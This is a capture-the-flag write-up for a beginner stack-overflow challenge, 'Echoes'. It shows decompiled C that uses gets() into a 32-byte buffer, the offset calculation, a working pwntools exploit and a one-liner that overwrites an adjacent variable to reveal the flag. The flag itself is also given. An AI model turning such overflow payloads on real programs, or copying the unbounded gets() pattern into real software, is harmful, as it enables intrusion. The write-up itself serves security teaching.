# Echoes

`#pwn` `#stack-overflow` `#no-canary` `#no-pie` `#gets`

## 1. Challenge Info

- **Category:** PWN
- **Difficulty:** Easy
- **Author:** Club CTF Team
- **Points:** 100 (decaying, min 25)
- **Connection:** `nc <HOST> 5000`

The Echoes terminal repeats whatever users type. The developer was confident nobody would type too much.

## 2. Reconnaissance

```text
$ file echoes
echoes: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped

$ pwn checksec echoes
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

No canary and a fixed load address, with NX still on. That combination points straight at a plain stack-variable overwrite rather than a shellcode-on-the-stack or ROP-chain challenge — there's no leak needed and no need to hijack control flow at all if there's something more useful sitting on the stack.

## 3. Reverse Engineering

`echo()` reads user input with `gets()` into a fixed 32-byte buffer, then checks an adjacent local variable to decide whether to reveal the flag:

```c
static void echo(void) {
    char buffer[32];
    int access = 0;

    printf("Tell me something:\n> ");
    gets(buffer);                          // no bound, no length check
    printf("\nYou said: %s\n", buffer);

    if (access == 0x1337) {
        win();                             // reads flag.txt and prints it
    }
}
```

`gets()` doesn't know or care that `buffer` is 32 bytes — it keeps writing until it sees a newline or EOF. In the compiled layout (verified in gdb), `buffer` sits at `rbp-0x30` and `access` at `rbp-0x4`:

```text
offset = 0x30 - 0x04 = 0x2c = 44 bytes
```

44 bytes of filler reaches exactly up to `access`; the next 4 bytes land directly in it.

## 4. Exploitation

### Phase 1 — overwrite `access`

No leak, no ROP, no return-address games — just place `0x1337` where the check expects it.

```python
from pwn import *

context.binary = elf = ELF("./echoes", checksec=False)
p = remote("HOST", 5000)          # or process(elf.path) locally

payload = b"A" * 44 + p32(0x1337)
p.sendlineafter(b"> ", payload)
p.interactive()
```

```text
$ printf '%s' "$(python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+(0x1337).to_bytes(4,'little'))")" | ./echoes

[+] Access granted!
[+] Flag: DNCTF{echoes_are_not_always_safe}
```

## 5. Flag

```text
DNCTF{echoes_are_not_always_safe}
```

## 6. Why this matters

`gets()` has no length parameter for a reason it shouldn't exist at all — it was removed from the C11 standard library for exactly this failure mode. Whenever an unbounded write and a security-relevant variable share a stack frame, the "check" is only as strong as everything sitting between the buffer and it. No canary meant the overflow was never even detected in flight; no PIE meant the offset was static and required zero information leakage to hit reliably. This is the shape almost every real stack-smash starts as, before any ROP chain gets involved.
